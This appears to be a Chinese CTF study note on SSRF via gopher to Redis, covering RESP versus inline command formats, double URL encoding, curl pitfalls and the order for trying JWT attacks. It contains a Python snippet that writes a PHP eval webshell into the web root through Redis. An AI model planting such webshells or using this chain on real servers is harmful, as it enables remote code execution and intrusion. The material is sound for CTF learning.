## 二、知识点

### 1. Redis 有两种命令写法（这是今天最值得记的）

以前只知道 RESP，原来 Redis 还支持更简单的**内联格式**。

**内联（Inline Commands）**：

```
命令 参数1 参数2\r\n
```

```
PING\r\n
KEYS *\r\n
GET flag\r\n
```

**RESP（REdis Serialization Protocol）**：

```
*<参数个数>\r\n$<参数长度>\r\n<内容>\r\n...
```

```
*3\r\n$3\r\nSET\r\n$3\r\nkey\r\n$5\r\nhello\r\n
```

**对比表**：

| 特性 | 内联 | RESP |
|---|---|---|
| 格式 | 纯文本 | 结构化 |
| 空格 | **参数分隔符** | 内容的一部分 |
| 特殊字符 | 受限 | 支持 |
| 空字符串 | 不支持 | 支持 |
| 二进制 | 不支持 | 支持 |
| 长度 | 短 | 长 |
| 手写难度 | **低** | 高 |
| 适合 | 探测 / 简单查询 | **写文件 / 复杂参数** |

**为什么 CTF 里内联更常见**：

```
① 短——gopher URL 有长度限制，内联能省一大半
② 好构造——直接写 "SET k v"，不用数长度
③ 探测够用——PING / INFO / KEYS 这类不需要二进制安全
```

**什么时候必须用 RESP**：

```
内容里有空格      → 内联会把空格当分隔符，参数被拆错
内容里有换行      → 内联按行解析，直接断掉
要传空字符串      → 内联表达不了
要写 webshell     → PHP 代码里有空格、引号、换行，必须 RESP
```

**手写 RESP 的坑**：**长度必须精确到字节**。

```
SET shell "<?php ?>"
```

`<?php ?>` 是 8 个字节，算成 7 就整串错位，Redis 直接解析失败。

**所以复杂命令用工具**：

```bash
python3 gopherus.py --exploit redis
```

它会自动算长度、做 URL 编码。

### 2. 双重 URL 编码

gopher 的 payload 本身要做一次 URL 编码（`%0d%0a` 那层）。但如果这个 payload 又是通过 **URL 参数**传进去的（比如 `?url=gopher://...`），服务端会再解码一次。

**结果就是**：你精心编码的 `%0d%0a` 被解成了真正的换行，payload 全乱。

**解法**：编两次。第一次编码后的 `%` 要再写成 `%25`。

```
原始     \r\n
一次编码  %0d%0a
两次编码  %250d%250a     ← 这样经过一次解码还原成 %0d%0a
```

### 3. curl 的两个坑：假失败和吞错误

**坑一：不加 `-k` 会「假失败」**

```
curl https://目标/           → SSL 证书错误，请求根本没发出去
curl -k https://目标/        → 忽略证书，正常请求
```

**表现是"没反应"，容易误判成"目标不可达"。**

**坑二：`-s` 会吞掉错误信息**

```
curl -s "http://目标/"       → 静默模式，错误信息也不打印
```

**排查阶段不要加 `-s`**，或者用 `-sS`（静默但显示错误）。

**这两个坑加起来很致命**：「看起来没反应」可能是证书问题，也可能是被 `-s` 藏了错误——**两个都排除掉才能怀疑目标**。

### 4. JWT 的攻击顺序

「过期文档」这题涉及 JWT，整理出的试探顺序：

```
① alg=none        把签名算法改成 none，去掉签名
② 默认密钥        用常见弱密钥爆破（secret / key / changeme...）
③ 字段误用        题里 role 要 root，不是 admin
④ 密钥泄露        从 .git / 源码里找密钥
```

**第 ③ 条最容易浪费时间**：题里说「管理员」，直觉填 `admin`，但源码里写的是 `root`。**先看源码能省掉这一步**。

### 5. 方法论：先看源码，再猜

这题复盘里最值钱的一条：

```
role 要 root        → 不用试 admin
密钥有默认值        → 先试默认值
有 /admin/fetch     → 知道 SSRF 入口
只允许 gopher       → 知道协议
```

**看源码 5 分钟，胜过盲试 1 小时。**

**配套的两条**：

| 原则 | 例子 |
|---|---|
| **题名和提示是线索，不是装饰** | 「过期文档」→ 历史版本；「追寻历史的脚步」→ `git log` |
| **错误信息要看全** | 被 `-s` 吞掉的错误，正是关键信息 |

### 6. gopher 探测的端口优先级

复盘里整理了一张常见服务端口表，探测时按这个顺序：

```
Web      80 / 443 / 8080 / 8000 / 5000
数据库   3306(MySQL) / 6379(Redis) / 5432(PostgreSQL) / 27017(MongoDB)
其他     9000(FastCGI) / 11211(Memcached) / 25(SMTP) / 21(FTP)
```

**Redis 和 FastCGI 优先试**——能直接 getshell，收益最高。

### 2. Redis RESP 写法（写文件必须用）

```python
def resp(*args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        b = a.encode()
        out += b"$%d\r\n" % len(b) + b + b"\r\n"
    return out

resp("CONFIG", "SET", "dir", "/var/www/html")
resp("SET", "x", '<?php @eval($_POST[1]);?>')
```

## 四、踩坑

| 坑 | 现象 | 原因 / 解决 |
|---|---|---|
| `alg=none` 试探失败 | 改了没效果 | 服务端可能禁了 none，或者版本校验签名 |
| 填 `admin` 而不是 `root` | 一直 403 | 源码里字段值是 root，先看源码 |
| 默认密钥试不出来 | 爆破无果 | 密钥可能在 `.env`，而 `.env` 要另外拿 |
| GitHack 拿不到 `.env` | 只拿到源码 | `.env` 可能在 `.gitignore` 里，历史提交里才有 |
| `curl` 不加 `-k` | 请求像没发出去 | 证书错误；加 `-k` |
| `curl -s` | 看不到错误 | 排查阶段去掉 `-s` 或用 `-sS` |
| gopher 的 `/_` 前缀 | payload 少了一段 | gopher URL 格式是 `gopher://host:port/_<data>`，下划线不能少 |
| 双重 URL 编码 | payload 被解坏 | 参数里传要先编码两次 |
| Redis 命令格式错 | 命令不执行 | 内联有空格就断，改用 RESP |
